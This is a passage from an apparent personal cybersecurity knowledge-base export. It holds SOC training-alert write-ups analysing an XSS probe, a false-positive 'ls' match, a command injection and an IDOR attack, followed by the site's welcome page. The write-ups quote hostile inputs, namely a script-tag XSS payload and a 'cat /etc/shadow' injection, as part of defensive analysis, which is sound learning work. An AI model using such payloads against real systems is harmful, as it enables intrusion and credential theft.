by the adversary in which the url  https://172.16.17.18/search was targeted. The host WebServer1001 was not breached and the attempt was Unsuccessful. There was no sign of the ip address in future and no furthur attempts were made by the adversary. The alert was True Positive."},"Writeups/SOC-Alerts/SOC166":{"title":"SOC166","links":["Assets/0466d09e1d8c22825726596287172d35_MD5.jpeg","SOC/XSS-Attack","HTB/http-response-code"],"tags":[],"content":"Alert\n\nEventID : 116\nEvent Time : Feb, 26, 2022, 06:56 PM\nRule : SOC166 - Javascript Code Detected in Requested URL\nLevel : Security Analyst\nHostname : WebServer1002\nDestination IP Address : 172.16.17.17\nSource IP Address : 112.85.42.13\nHTTP Request Method : GET\nRequested URL : https://172.16.17.17/search/?q=&lt;script&gt;javascript:alert(1)&lt;$/script&gt;\nUser-Agent : Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1\nAlert Trigger Reason : Javascript code detected in URL\nDevice Action : Allowed\n\nAnalysis\nIP Address\nOpen: Pasted image 20250216205216.png\n\nReputation looks good.\nLogs\nThe attacker tried several XSS Attack on /search/?q= parameter. The network traffic was permitted by the firewall but the http response code was 302 which means that the attack was unsuccessful. The user-agent of attacker was Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1\nEndpoint\nNo signs of malicious activity on the host"},"Writeups/SOC-Alerts/SOC167":{"title":"SOC167","links":["Assets/8097dabb15a61263702e88959dbe7bf9_MD5.jpeg"],"tags":[],"content":"Alert\n\nEventID: 117\nEvent Time: Feb 27, 2022, 12:36 AM\nRule: SOC167 - LS Command Detected in Requested URL\nLevel: Security Analyst\nHostname: EliotPRD\nDestination IP Address: 188.114.96.15\nSource IP Address: 172.16.17.46\nHTTP Request Method: GET\nRequested URL: letsdefend.io/blog/\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0\nAlert Trigger Reason: URL Contains LS\nDevice Action: Allowed\n\nAnalysis\nIP Address\nSource\nThe source is from the company network. Checking the host endpoint for details. The endpoint seems intact and no malicious activity is seen. The host did contact the destination server.\nDestination\nOpen: Pasted image 20250216211945.png\n\nSAFE\n_What is going on here?\nLogs\nThe destination server actually hosts company website. There is nothing sus.\nConclusion\nI am dumb. This is a False Positive. The ls command was mistakenly taken from the word skills."},"Writeups/SOC-Alerts/SOC168":{"title":"SOC168","links":["Assets/36930092e18696e5a6839d2fb09dedcb_MD5.jpeg","SOC/Command-Injection","HTB/http-response-code"],"tags":[],"content":"Alert\n\nEventID: 118\nEvent Time: Feb 28, 2022, 04:12 AM\nRule: SOC168 - Whoami Command Detected in Request Body\nLevel: Security Analyst\nHostname: WebServer1004\nDestination IP Address: 172.16.17.16\nSource IP Address: 61.177.172.87\nHTTP Request Method: POST\nRequested URL: https://172.16.17.16/video/\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\nAlert Trigger Reason: Request Body Contains whoami string\nDevice Action: Allowed\n\nAnalysis\nIP Address\nOpen: Pasted image 20250216210628.png\n\nsus\nLogs\nOh no! There are multiple attempts of Command Injection in POST Parameter : ?c=cat /etc/shadow. The response sizes vary and http response code are 200. The attack was successful. Also, the attacker user-agent is Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\nEndpoint\nCommand history confirms that the attack was successful. There are instances of commands run by the attacker. The endpoint was contained immediately."},"Writeups/SOC-Alerts/SOC169":{"title":"SOC169","links":["Assets/84b812c00a42d636ad1702fcb1da08bb_MD5.jpeg"],"tags":[],"content":"Alert\n\nEventID : 119\nEvent Time : Feb, 28, 2022, 10:48 PM\nRule : SOC169 - Possible IDOR Attack Detected\nLevel : Security Analyst\nHostname : WebServer1005\nDestination IP Address : 172.16.17.15\nSource IP Address : 134.209.118.137\nHTTP Request Method : POST\nRequested URL : https://172.16.17.15/get_user_info/\nUser-Agent : Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)\nAlert Trigger Reason : consecutive requests to the same page\nDevice Action : Allowed\n\nAnalysis\nIP Address Analysis\nOpen: Pasted image 20250215184003.png\n\nIP Address is not malicious and was not seen earlier and ever after.\nAttack Analysis\nThe adversary tried to exploit ?user_id= parameter and access other user’s info. The response sizes are different and response code was 200. The IDOR attack was successful. Requested server containment.\nReport\nIDOR Attack was performed on WebServer1005 by 134.209.118.137. The attacker was successful in gaining hands on userdata by exploiting ?user_id= parameter. The exploit needs immediate patching. The webserver has been contained."},"index":{"title":"Welcome to my Knowledgebase","links":["AI/Foundations-of-AI","SOC/!!-SOC-Learning-Pathway-!!","Networking","Writeups"],"tags":[],"content":"👋 Hi there! Welcome to my digital knowledge base—a curated collection of my learning journey in cybersecurity, networking, AI, and more.\nThis is where I document my notes, methodologies, and experiments as I explore the world of technology. Think of it as my personal wiki, constantly evolving as I learn new things.\n\n🌱 What’s Here?\nThis knowledge base is organized into a few key areas:\n🎯 Hack The Box (HTB)\nNotes from HTB Academy . A step-by-step breakdown of how I approach problems and solve them.\n🌐 Networking\nA deep dive into networking concepts, protocols, and tools. From the basics to advanced topics, this is where I document my understanding of how networks work.\n📝 Writeups\nA detailed walkthrough of machines I’ve pwned (not many yet, but growing) and soc alert analysis.\n🔒 Security Operations Center (SOC)\nNotes and insights about SOC workflows, tools, and techniques. This section is all about understanding how security teams operate and respond to threats.\n🤖 AI\nExplorations into artificial intelligence concepts, algorithms, and applications. This is where I document my journey into the world of AI and machine learning.\n\n🚀 Start Here\nIf you’re new here, these are some good places to start:\n\nAI Concepts\nSOC Path\nNetworking Basics\nWriteups\n\n\n📌 Why This Exists\nThis knowledge base is my way of:\n\nOrganizing what I learn.\nSharing insights and resources with others.\nTracking my progress over time.\n\nIt’s not perfect, but it’s honest and always growing.\n\nThanks for stopping by! If you find something useful or want to chat, feel free to reach out.\n\nThis is just a learning resource. I do not encourage use of the tools/methodologies described here to cause harm to anyone. The files linked are not meant to be downloaded and ran in your system."}}